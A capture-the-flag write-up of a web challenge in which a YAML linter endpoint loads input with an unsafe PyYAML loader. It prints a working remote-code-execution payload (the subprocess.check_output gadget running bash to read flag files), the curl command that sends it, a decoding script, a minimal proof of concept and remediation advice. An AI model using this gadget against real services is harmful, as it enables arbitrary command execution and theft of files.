# Day 04 — ARIKA

**Category:** Web / Deserialization  
**Impact:** Remote Code Execution (RCE) via unsafe YAML load  
**Status:** Solved

## TL;DR
The challenge endpoint deserialized user-controlled YAML with an unsafe PyYAML loader. Using the `!!python/object/apply:subprocess.check_output` gadget, we executed a shell command that base64-printed the flag from common paths. We scraped the base64 blob from the HTTP response and decoded it locally.

---

## Target
```
POST https://<challenge-host>/lint
Cookie: token=<REDACTED>
Content-Type: application/json
```
The server expects JSON with a `yaml_content` field. Internally, it was calling a vulnerable YAML load (e.g., `yaml.load(...)`), which executes constructors in special tags.

---

## Vulnerability
**Unsafe YAML Deserialization (PyYAML)**  
Using `yaml.load` (or `FullLoader`) on untrusted data enables “execution gadgets,” e.g.:

```yaml
title: !!python/object/apply:subprocess.check_output
  - ["bash","-lc","<attacker command>"]
```
When the YAML is parsed, the loader runs `subprocess.check_output(...)` and returns the output as the YAML value.

---

## Payload (JSON)
We embedded a YAML document inside JSON that instructs the server to execute `bash -lc` and try several typical flag paths, base64-encoding whichever exists:

```json
{
  "yaml_content": "title: !!python/object/apply:subprocess.check_output\n  - [\"bash\",\"-lc\",\"base64 /flag || base64 /flag.txt || base64 /app/flag || base64 /app/flag.txt || true\"]\nlogsource: {category: process_creation}\ndetection:\n  sel: {Image|endswith: foo}\ncondition: sel\n",
  "method": "s2"
}
```
Notes:
- The `||` chain ensures the command succeeds even if earlier paths are missing.
- `method: "s2"` matched the app’s expected field for this code path (harmless filler to keep the schema valid).

---

## Exploit Steps

1) **Save the payload**
```bash
cat > payload_exploit.json <<'JSON'
{
  "yaml_content": "title: !!python/object/apply:subprocess.check_output\n  - [\"bash\",\"-lc\",\"base64 /flag || base64 /flag.txt || base64 /app/flag || base64 /app/flag.txt || true\"]\nlogsource: {category: process_creation}\ndetection:\n  sel: {Image|endswith: foo}\ncondition: sel\n",
  "method": "s2"
}
JSON
```

2) **Send to `/lint` with your session token**
```bash
TOKEN='<REDACTED_TOKEN>'

curl -i -s -k 'https://<challenge-host>/lint' \
  -H 'Content-Type: application/json' \
  -H "Cookie: token=${TOKEN}" \
  --data-binary @payload_exploit.json > resp_raw.txt
```

3) **Extract the first large base64 blob and decode**
```bash
grep -oE '([A-Za-z0-9+/]{40,}={0,2})' resp_raw.txt | head -n1 | tr -d '\n' > maybe_b64.txt

# decode to flag.txt if present
if [[ -s maybe_b64.txt ]]; then
  base64 -d maybe_b64.txt > flag.txt 2>/dev/null \
    && echo "[+] Decoded to flag.txt" \
    && sed -n '1,5p' flag.txt \
    || echo "[-] Found base64-ish blob, but decode failed"
else
  echo "[-] No large base64 block found in response"
fi
```

---

## Evidence / Artifacts
- `payload_exploit.json` – exact JSON sent to the linter  
- `resp_raw.txt` – full HTTP response (headers + body)  
- `maybe_b64.txt` – extracted candidate base64 blob  
- `flag.txt` – decoded flag (if present)

*(Commit these with the token redacted.)*

---

## Root Cause
- The server treated user input as trusted YAML.  
- It used **unsafe loaders** (`yaml.load`/`FullLoader`) enabling special tags like
  `!!python/object/apply:subprocess.check_output` to execute arbitrary code.

---

## Remediation
- Use **`yaml.safe_load`** (or `CSafeLoader`) for all untrusted YAML.  
- Remove Python-object constructors (`!!python/*`) from allowed tags.  
- Avoid executing external processes based on user input; if needed, strictly whitelist commands/args.  
- Sandbox the service (seccomp/AppArmor, minimal FS, no secrets in default locations).

---

## Appendix

### Full YAML (as parsed)
```yaml
title: !!python/object/apply:subprocess.check_output
  - ["bash","-lc","base64 /flag || base64 /flag.txt || base64 /app/flag || base64 /app/flag.txt || true"]
logsource:
  category: process_creation
detection:
  sel:
    Image|endswith: foo
condition: sel
```

### Minimal PoC (single-path example)
```yaml
title: !!python/object/apply:subprocess.check_output
  - ["bash","-lc","base64 /flag"]
```

---

## Repo placement
Place these under:

```
Day 04/ARIKA/
  README.md                # this write-up
  payload_exploit.json
  resp_raw.txt
  maybe_b64.txt
  flag.txt                 # optional; redact if sensitive
```
